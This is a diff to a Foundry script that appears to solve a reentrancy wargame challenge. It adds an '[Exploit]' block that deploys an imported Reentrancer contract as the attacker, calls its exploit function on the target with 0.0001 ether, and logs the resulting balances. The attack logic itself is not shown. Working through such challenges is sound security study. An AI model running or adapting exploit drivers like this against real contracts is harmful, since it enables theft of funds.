@@ -4,6 +4,8 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
 import "src/Reentrance/Reentrance.sol";
+import "./Reentrancer.sol";
+
 contract ReentranceScript is Script {
 
     address internal attacker;
@@ -48,6 +50,13 @@ contract ReentranceScript is Script {
         console2.log("attacker : %s", attacker);
         console2.log("target.balance : %d wei", address(target).balance);
 
-        
+        console2.log("[Exploit]");
+        uint256 initBalance = 0.0001 ether;
+        vm.startBroadcast(attacker);
+        Reentrancer reentrancer = new Reentrancer();
+        reentrancer.exploit{value: initBalance}(address(target));
+        vm.stopBroadcast();
+        console2.log("balanceOf[reentrancer] : %d wei", target.balanceOf(address(reentrancer)));
+        console2.log("target.balance         : %d wei", address(target).balance);
     }
 }
